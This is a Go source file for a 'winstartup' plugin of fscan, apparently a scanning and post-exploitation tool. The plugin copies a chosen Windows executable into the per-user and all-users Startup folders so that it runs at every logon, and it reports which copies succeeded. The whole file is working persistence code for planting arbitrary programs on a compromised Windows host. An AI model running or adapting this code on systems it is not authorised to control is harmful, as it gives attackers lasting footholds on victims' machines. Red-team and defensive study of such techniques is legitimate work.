//go:build (plugin_winstartup || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

type WinStartupPlugin struct {
	plugins.BasePlugin
}

func NewWinStartupPlugin() *WinStartupPlugin {
	return &WinStartupPlugin{
		BasePlugin: plugins.NewBasePlugin("winstartup"),
	}
}

func (p *WinStartupPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	pePath := session.Config.WinPEFile
	if pePath == "" {
		return &plugins.Result{Success: false, Error: 		fmt.Errorf("%s", i18n.GetText("local_pe_not_specified"))}
	}
	if _, err := os.Stat(pePath); err != nil {
		return &plugins.Result{Success: false, Error: 		fmt.Errorf("%s", i18n.Tr("local_pe_not_found", pePath))}
	}

	absPath, _ := filepath.Abs(pePath)
	fileName := filepath.Base(absPath)

	locations := []struct {
		name string
		dir  string
	}{
		{"用户启动文件夹", filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")},
		{"公共启动文件夹", filepath.Join(os.Getenv("ProgramData"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")},
	}

	var output strings.Builder
	var successCount int

	for _, loc := range locations {
		target := filepath.Join(loc.dir, fileName)
		if err := copyFile(absPath, target); err != nil {
			output.WriteString(fmt.Sprintf("[失败] %s: %v\n", loc.name, err))
			continue
		}
		output.WriteString(fmt.Sprintf("[成功] %s -> %s\n", loc.name, target))
		successCount++
	}

	if successCount > 0 {
		common.LogSuccess(i18n.Tr("winstartup_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
	}
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

func init() {
	RegisterLocalPlugin("winstartup", func() Plugin {
		return NewWinStartupPlugin()
	})
}
